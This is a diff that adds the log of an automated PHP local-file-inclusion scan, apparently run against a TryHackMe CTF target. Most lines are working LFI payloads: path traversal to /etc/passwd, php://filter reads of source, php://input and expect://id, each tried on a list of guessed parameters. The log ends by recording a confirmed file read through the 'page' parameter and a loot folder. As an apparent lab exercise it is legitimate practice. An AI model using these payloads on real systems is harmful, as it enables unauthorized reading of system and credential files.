@@ -1,0 +1,132 @@
+﻿
+[22:25:52] === Automatic PHP vulnerability scan: http://10.146.184.99:80/ ===
+[22:25:52] --- Crawling for PHP files and parameters ---
+[22:25:52]   crawled /  [200] len=15757
+[22:25:53]   crawled /sidebar-right.html  [200] len=9974
+[22:25:54]   crawled /index.html  -> NO RESPONSE
+[22:25:54]   crawled /about.html  [200] len=9309
+[22:25:55]   crawled /services.html  [200] len=9131
+[22:25:55]   crawled /portfolio.html  [200] len=14352
+[22:25:56]   crawled /index.php?=portfolio.html  [200] len=15757
+[22:25:57]   crawled /contact.html  [200] len=7507
+[22:25:57] PHP files seen: index.php
+[22:25:57] Parameters discovered from links: index.php|page
+[22:25:57] Total candidates to test (capped at 40): 15
+[22:25:57] candidate: page=
+[22:25:57] CONFIRMED LFI  page=php://filter/resource=/etc/passwd  (real /etc/passwd content)
+[22:25:57] candidate: file=
+[22:25:58]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:25:58]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:25:59]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:00]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:00]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:01]     php://input -> [200] len=15757 (no match)
+[22:26:02]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:02] candidate: path=
+[22:26:02]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:03]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:03]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:04]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:05]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:05]     php://input -> [200] len=15757 (no match)
+[22:26:06]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:06] candidate: view=
+[22:26:07]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:07]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:08]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:09]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:09]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:10]     php://input -> [200] len=15757 (no match)
+[22:26:11]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:11] candidate: template=
+[22:26:11]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:12]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:12]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:13]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:14]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:14]     php://input -> [200] len=15757 (no match)
+[22:26:15]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:15] candidate: include=
+[22:26:16]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:16]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:17]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:18]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:18]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:19]     php://input -> [200] len=15757 (no match)
+[22:26:19]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:19] candidate: doc=
+[22:26:20]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:21]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:21]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:22]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:23]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:23]     php://input -> [200] len=15757 (no match)
+[22:26:24]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:24] candidate: p=
+[22:26:25]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:25]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:26]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:26]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:27]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:28]     php://input -> [200] len=15757 (no match)
+[22:26:28]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:28] candidate: pg=
+[22:26:29]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:30]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:30]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:31]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:32]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:32]     php://input -> [200] len=15757 (no match)
+[22:26:33]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:33] candidate: document=
+[22:26:34]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:34]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:35]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:35]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:36]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:37]     php://input -> [200] len=15757 (no match)
+[22:26:37]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:37] candidate: module=
+[22:26:38]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:39]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:39]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:40]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:40]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:41]     php://input -> [200] len=15757 (no match)
+[22:26:42]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:42] candidate: action=
+[22:26:42]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:43]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:44]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:44]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:45]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:46]     php://input -> [200] len=15757 (no match)
+[22:26:46]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:46] candidate: content=
+[22:26:47]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:47]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:48]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:49]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:49]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:50]     php://input -> [200] len=15757 (no match)
+[22:26:51]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:51] candidate: load=
+[22:26:51]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:52]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:53]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:53]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:54]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:55]     php://input -> [200] len=15757 (no match)
+[22:26:55]     expect://id -> [200] len=15757 (extension not loaded)
+[22:26:55] candidate: name=
+[22:26:56]     php://filter/resource=/etc/passwd -> [200] len=15757 (no match)
+[22:26:56]     ../../../../../../../../etc/passwd -> [200] len=15757 (no match)
+[22:26:57]     ....//....//....//....//....//....//etc/passwd -> [200] len=15757 (no match)
+[22:26:58]     ..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd -> [200] len=15757 (no match)
+[22:26:58]     php://filter/convert.base64-encode/resource=index.php -> [200] len=15757 (no match)
+[22:26:59]     php://input -> [200] len=15757 (no match)
+[22:27:00]     expect://id -> [200] len=15757 (extension not loaded)
+[22:27:00] === Done. Loot: C:\Users\Angel\Documents\GitHub\ctf\tryhackme\Red\loot_php_10_146_184_99 ===
+[22:27:00] Requests sent: 99   No-response: 0
+[22:27:00] --- VERIFIED FINDINGS ---
+[22:27:00]   page=php://filter/resource=/etc/passwd
